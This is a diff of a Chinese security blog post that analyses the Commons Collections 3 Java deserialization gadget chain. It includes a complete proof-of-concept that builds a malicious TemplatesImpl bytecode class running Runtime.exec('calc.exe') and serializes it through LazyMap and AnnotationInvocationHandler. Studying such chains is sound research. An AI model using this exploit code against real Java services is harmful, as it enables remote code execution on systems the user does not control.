@@ -8,18 +8,33 @@
   <link rel="dns-prefetch" href="https://teaboj.github.io">
   <title>Commons Collections 3 | TeaBo’s 树洞</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="这篇文章好像需要密码呢">
+  <meta name="description" content="序言环境配置还是与CC1一样：java环境：1.7 , commons-collections: 3.1 如果说CC1是从AnnotationInvocationHandler的readOject入手，利用Map(proxy).entrySet()触发TransformedMap-&gt;checkSetValue()，进而调用ChainedTransformer-&gt;transform(">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Commons Collections 3">
 <meta property="og:url" content="https://teaboj.github.io/2021/07/28/Commons-Collections-3/index.html">
 <meta property="og:site_name" content="TeaBo’s 树洞">
-<meta property="og:description" content="这篇文章好像需要密码呢">
+<meta property="og:description" content="序言环境配置还是与CC1一样：java环境：1.7 , commons-collections: 3.1 如果说CC1是从AnnotationInvocationHandler的readOject入手，利用Map(proxy).entrySet()触发TransformedMap-&gt;checkSetValue()，进而调用ChainedTransformer-&gt;transform(">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://teaboj.github.io/2021/07/28/Commons-Collections-3/Q$@AJTJ%5BEV2%7DKJF6VB4%7DUP.png">
+<meta property="og:image" content="https://teaboj.github.io/2021/07/28/Commons-Collections-3/image-20210729195909769.png">
+<meta property="og:image" content="https://teaboj.github.io/2021/07/28/Commons-Collections-3/image-20210729195956537.png">
+<meta property="og:image" content="https://teaboj.github.io/2021/07/28/Commons-Collections-3/image-20210729200319783.png">
+<meta property="og:image" content="https://teaboj.github.io/2021/07/28/Commons-Collections-3/image-20210729200415788.png">
+<meta property="og:image" content="https://teaboj.github.io/2021/07/28/Commons-Collections-3/image-20210729200442460.png">
+<meta property="og:image" content="https://teaboj.github.io/2021/07/28/Commons-Collections-3/image-20210729200514619.png">
+<meta property="og:image" content="https://teaboj.github.io/2021/07/28/Commons-Collections-3/image-20210729200822597.png">
+<meta property="og:image" content="https://teaboj.github.io/2021/07/28/Commons-Collections-3/image-20210729200831643.png">
+<meta property="og:image" content="https://teaboj.github.io/2021/07/28/Commons-Collections-3/image-20210729200846459.png">
+<meta property="og:image" content="https://teaboj.github.io/2021/07/28/Commons-Collections-3/image-20210729201126632.png">
+<meta property="og:image" content="https://teaboj.github.io/2021/07/28/Commons-Collections-3/image-20210729201146030.png">
+<meta property="og:image" content="https://teaboj.github.io/2021/07/28/Commons-Collections-3/image-20210729201159698.png">
+<meta property="og:image" content="https://teaboj.github.io/2021/07/28/Commons-Collections-3/image-20210729201419416.png">
 <meta property="article:published_time" content="2021-07-28T06:10:44.000Z">
-<meta property="article:modified_time" content="2021-07-28T06:22:50.132Z">
+<meta property="article:modified_time" content="2021-07-29T12:20:18.140Z">
 <meta property="article:author" content="TeaBo">
 <meta property="article:tag" content="java代码审计">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://teaboj.github.io/2021/07/28/Commons-Collections-3/Q$@AJTJ%5BEV2%7DKJF6VB4%7DUP.png">
   
     <link rel="alternative" href="/atom.xml" title="TeaBo’s 树洞" type="application/atom+xml">
   
@@ -76,7 +91,7 @@
 			</ul>
 		</nav>
 		<nav>
-			总文章数 11
+			总文章数 12
 		</nav>
 		<nav class="header-smart-menu">
     		
@@ -190,18 +205,58 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="哒咩哒咩！" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="3a4432a582049b1f17f8b38643578314983aca42c73052de8a1ef32133408108">e2b7d63e5d20c734d3e26178b7822f212a0d7de19feffceb0ba04b51e49c2de2</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">
+        <a id="more"></a>
+
+<h3 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h3><p>环境配置还是与CC1一样：java环境：1.7 , commons-collections: 3.1</p>
+<p>如果说CC1是从<code>AnnotationInvocationHandler</code>的readOject入手，利用<code>Map(proxy).entrySet()</code>触发<code>TransformedMap-&gt;checkSetValue()</code>，进而调用<code>ChainedTransformer-&gt;transform()</code>，CC2是利用<code>InvokerTransformer.transform()</code>调用<code>newTransformer</code>去<code>加载字节码</code>RCE的话，那么CC3就像是<a href="https://teabo.top/2021/07/27/Commons-Collections-1/" target="_blank" rel="noopener">CC1</a>和<a href="https://teabo.top/2021/07/27/Commons-Collections-2/" target="_blank" rel="noopener">CC2</a>二者的<strong>结合</strong>。</p>
+<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h4><p>org.apache.commons.collections.functors.InstantiateTransformer</p>
+<p><img src="/2021/07/28/Commons-Collections-3/Q$@AJTJ%5BEV2%7DKJF6VB4%7DUP.png" alt="img"></p>
+<p>其transform方法：</p>
+<p><img src="/2021/07/28/Commons-Collections-3/image-20210729195909769.png" alt="image-20210729195909769"></p>
+<p>注意这里最终返回的是一个对象的初始化，并且其中参数都可控，看到这个实例化，有没有一丝丝CC2加载字节码的感觉。</p>
+<h4 id="TrAXFilter"><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h4><p>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</p>
+<p><img src="/2021/07/28/Commons-Collections-3/image-20210729195956537.png" alt="image-20210729195956537"></p>
+<p><code>_transformer = (TransformerImpl) templates.newTransformer();</code></p>
+<p>看到这个<code>newTransformer()</code>是不是更像CC2了，CC2是用<code>InvokerTransformer</code>来反射触发<code>TemplatesImpl.newTransformer()</code>，最后触发<code>_class.newInstance()</code>实例化加载字节码触发RCE。</p>
+<p>而这里的<code>TrAXFilter</code>可以代替<code>InvokerTransformer</code>调用<code>newTransformer()</code>，上面的<code>InstantiateTransformer</code>再来充当实例化<code>TrAXFilter</code>的角色。</p>
+<h3 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//javassist 生成字节码</span></span><br><span class="line">        ClassPool pool=ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass test=pool.makeClass(<span class="string">"EvilTeabo"</span>);</span><br><span class="line">        String name=<span class="string">"EvilTeabo"</span>;</span><br><span class="line">        test.setName(name);</span><br><span class="line">        String cmd=<span class="string">"java.lang.Runtime.getRuntime().exec(\"calc.exe\");"</span>;</span><br><span class="line">        <span class="comment">//System.out.println(pool.get(AbstractTranslet.class.getName()));</span></span><br><span class="line">        test.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line">        CtConstructor cst=test.makeClassInitializer();</span><br><span class="line">        cst.insertBefore(cmd);</span><br><span class="line">        test.writeFile(<span class="string">"./"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytes= test.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//TemplatesImpl 加载字节码</span></span><br><span class="line">        TemplatesImpl templates=TemplatesImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>()</span>;</span><br><span class="line">        Class temp=Class.forName(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//先挨个设置反射时候内部链所需的值</span></span><br><span class="line">        Field _name=temp.getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">        _name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _name.set(templates,<span class="string">"Teabo"</span>);  <span class="comment">//_name满足非空</span></span><br><span class="line"></span><br><span class="line">        Field _bytecodes = temp.getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _bytecodes.set(templates,<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;bytes&#125;); <span class="comment">// _bytecodes赋值一个javassist得到的Byte数组</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造chainedTransformer,用TrAXFilter调用InstantiateTransformer的newIntance()</span></span><br><span class="line">        Transformer[] chain=<span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> ChainedTransformer(chain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置LazyMap对象的factory属性为chainedTransformer链</span></span><br><span class="line">        Map map=<span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazymap= LazyMap.decorate(map,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//以下为cc1部分AnnotationInvocationHandler</span></span><br><span class="line">        Class cl = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor ctor = cl.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取AnnotationInvocationHandler类实例，并传入transformedMap</span></span><br><span class="line">        InvocationHandler invocationHandler=(InvocationHandler)ctor.newInstance(Override<span class="class">.<span class="keyword">class</span>,<span class="title">lazymap</span>)</span>;</span><br><span class="line">        Map map1=(Map) Proxy.newProxyInstance(LazyMap<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>(),<span class="title">LazyMap</span>.<span class="title">class</span>.<span class="title">getInterfaces</span>(),<span class="title">invocationHandler</span>)</span>;</span><br><span class="line">        Object object=ctor.newInstance(Override<span class="class">.<span class="keyword">class</span>,<span class="title">map1</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"./evilCC3.bin"</span>));</span><br><span class="line">        outputStream.writeObject(object);</span><br><span class="line">        outputStream.close();</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"./evilCC3.bin"</span>));</span><br><span class="line">        inputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>利用链：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">           AnnotationInvocationHandler.readObject()</span><br><span class="line">               Map(Proxy).entrySet()</span><br><span class="line">                   AnnotationInvocationHandler.invoke()</span><br><span class="line">                       LazyMap.get()</span><br><span class="line">                           ChainedTransformer.transform()</span><br><span class="line">                           ConstantTransformer.transform()</span><br><span class="line">                           InstantiateTransformer.transform()</span><br><span class="line">                           newInstance()</span><br><span class="line">                               TrAXFilter#TrAXFilter()</span><br><span class="line">                               TemplatesImpl.newTransformer()</span><br><span class="line">                                        TemplatesImpl.getTransletInstance()</span><br><span class="line">                                        TemplatesImpl.defineTransletClasses</span><br><span class="line">                                        newInstance()</span><br><span class="line">                                           Runtime.exec()</span><br></pre></td></tr></table></figure>
+
+<p>前半段生成字节码文件和设置TemplatesImpl的值与CC2一模一样。可以参考CC2。</p>
+<p><img src="/2021/07/28/Commons-Collections-3/image-20210729200319783.png" alt="image-20210729200319783"></p>
+<p>但是接下来和CC2有不同的地方，CC2是用<code>ComparatorTransformer</code>来调用<code>InvokerTransformer.transform()</code>去触发<code>TemplatesImpl.newTransform()</code>，进而实例化字节码文件。而根据前置知识的了解可以知道，这里还能用<code>InstantiateTransformer</code>对象去实例化<code>TrAXFilter</code>,在里面触发<code>newTransform()</code>实例化。</p>
+<p>所以这里这样构造：</p>
+<p><img src="/2021/07/28/Commons-Collections-3/image-20210729200415788.png" alt="image-20210729200415788"></p>
+<p>而接下来如何触发<code>ChainedTransformer.transform()</code>的方法也是CC1中接触过的，那就是<code>Lazymap</code></p>
+<p><img src="/2021/07/28/Commons-Collections-3/image-20210729200442460.png" alt="image-20210729200442460"></p>
+<p>在CC1中分析过，可以知道<code>LazyMap.get()</code>可以触发<code>transform</code>方法</p>
+<p><img src="/2021/07/28/Commons-Collections-3/image-20210729200514619.png" alt="image-20210729200514619"></p>
+<p>而接下来readObject()入口依然采用CC1中的<code>AnnotationInvocationHandler</code>。</p>
+<p>看着有点迷，来分析一下。</p>
+<p>首先反射创建了一个<code>AnnotationInvocationHandler</code>对象，实例化的时候传入了<code>Target.class</code>和<code>lazymap</code></p>
+<p>(传入Target.class的原因cc2中也讲过，因为这是一个处理注解的类，构造方法的第一个参数是Annotation类型参数。)</p>
+<p>而下面是一个动态代理，传递三个参数ClassLoader,要代理的接口数组和<strong>调用接口时触发的参数</strong>（这里就是实例化过后的<code>AnnotationInvocationHandler</code>）。</p>
+<p><strong>当调用代理对象的任意方法时，就会触发代理类的invoke方法</strong>。这里就是<code>AnnotationInvocationHandler</code>的<code>invoke</code>方法，而在他的invoke()里就会调用到<code>get</code>方法。</p>
+<h3 id="命令执行过程"><a href="#命令执行过程" class="headerlink" title="命令执行过程"></a>命令执行过程</h3><p>在readObject()中，由于<strong>被代理</strong>的<code>lazymap</code>对象调用了<code>entrySet</code>方法，所以就调用了<code>AnnotationInvocationHandler</code>的<code>invoke</code>方法.</p>
+<p><img src="/2021/07/28/Commons-Collections-3/image-20210729200822597.png" alt="image-20210729200822597"></p>
+<p>调用LazyMap的get()</p>
+<p><img src="/2021/07/28/Commons-Collections-3/image-20210729200831643.png" alt="image-20210729200831643"></p>
+<p>触发ChianedTransformer.transform()</p>
+<p><img src="/2021/07/28/Commons-Collections-3/image-20210729200846459.png" alt="image-20210729200846459"></p>
+<p>这里将第一次返回的<code>TrAXFilter.class</code>作为<code>InstantiateTransformer</code>的input输入,<code>iArgs</code>为包含恶意<code>_bytecodes</code>的<code>TemplatesImpl</code>对象,<code>iParamTypes</code>为对应构造函数类型的<code>Templates.class</code>。</p>
+<p><code>con.newInstance(iArgs)</code>实例化TrAXFilter</p>
+<p>在TrAXFilter的构造函数中，调用<code>Templates.newTransformer()</code></p>
+<p><img src="/2021/07/28/Commons-Collections-3/image-20210729201126632.png" alt="image-20210729201126632"></p>
+<p>接下来的步骤也是与CC2中的一样，从newTransformer()开始，经过处理后将字节码还原成类，并最终实例化触发static中代码块</p>
+<p><img src="/2021/07/28/Commons-Collections-3/image-20210729201146030.png" alt="image-20210729201146030"></p>
+<p>newInstance()实例化的时候就会执行静态代码块中的内容。</p>
+<p><img src="/2021/07/28/Commons-Collections-3/image-20210729201159698.png" alt="image-20210729201159698"></p>
+<p><img src="/2021/07/28/Commons-Collections-3/image-20210729201419416.png" alt="image-20210729201419416"></p>
+<h3 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h3><p>调过CC1和CC2的利用链之后再来看CC3，明显感觉简单了很多，前半部分用的CC2的代码，包括字节码生成，TemplatesImpl构造，后半部分就是用的CC1中的内容了。</p>
+<p>在分析CC3的时候也是在温习CC1和CC2，发现有些东西的理解更加深刻了，对java反序列化以及开始有一丝丝“灵性”了。</p>
+
       
 
 	
@@ -246,6 +301,15 @@
   
 <nav id="article-nav">
   
+    <a href="/2021/07/29/Commons-Collections-4/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          Commons Collections 4
+        
+      </div>
+    </a>
+  
   
     <a href="/2021/07/27/Commons-Collections-2/" id="article-nav-older" class="article-nav-link-wrap">
       <div class="article-nav-title">Commons Collections 2</div>
@@ -275,7 +339,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    目录，不存在的…
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#序言"><span class="toc-number">1.</span> <span class="toc-text">序言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#前置知识"><span class="toc-number">2.</span> <span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#InstantiateTransformer"><span class="toc-number">2.1.</span> <span class="toc-text">InstantiateTransformer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TrAXFilter"><span class="toc-number">2.2.</span> <span class="toc-text">TrAXFilter</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC分析"><span class="toc-number">3.</span> <span class="toc-text">POC分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#命令执行过程"><span class="toc-number">4.</span> <span class="toc-text">命令执行过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#结尾"><span class="toc-number">5.</span> <span class="toc-text">结尾</span></a></li></ol>
                     </div>
                 </span>
             </div>
